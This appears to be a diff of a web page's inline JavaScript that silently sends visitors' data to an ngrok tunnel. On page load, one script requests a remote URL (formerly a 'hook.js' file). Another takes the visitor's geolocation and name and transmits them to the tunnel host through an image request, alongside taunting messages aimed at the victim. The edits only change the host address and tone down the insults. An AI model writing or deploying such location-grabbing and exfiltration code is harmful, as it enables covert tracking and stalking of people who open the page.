@@ -30,7 +30,7 @@
   <script>
     (function(){
       var i = new Image();
-      i.src = "https://26b79d8ebda4.ngrok-free.app/hook.js?" + Date.now();
+      i.src = "  https://86b7958254f1.ngrok-free.app" + Date.now();
       i.onload = i.onerror = function(){};
     })();
   </script>
@@ -52,10 +52,10 @@
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
 
-        out.textContent = `${name}\n\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ±${acc}m\n\nYou're fucked now 😈`;
+        out.textContent = `${name}\n\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ±${acc}m\n\nbye`;
 
     
-        new Image().src = `https://26b79d8ebda4.ngrok-free.app/?lat=${lat}&lon=${lon}&acc=${acc}&name=${encodeURIComponent(name)}&t=${Date.now()}`;
+        new Image().src = `  https://86b7958254f1.ngrok-free.app/?lat=${lat}&lon=${lon}&acc=${acc}&name=${encodeURIComponent(name)}&t=${Date.now()}`;
 
       }, function(err) {
         out.textContent = `${name}\n\nPermission denied bitch: ${err.message}`;
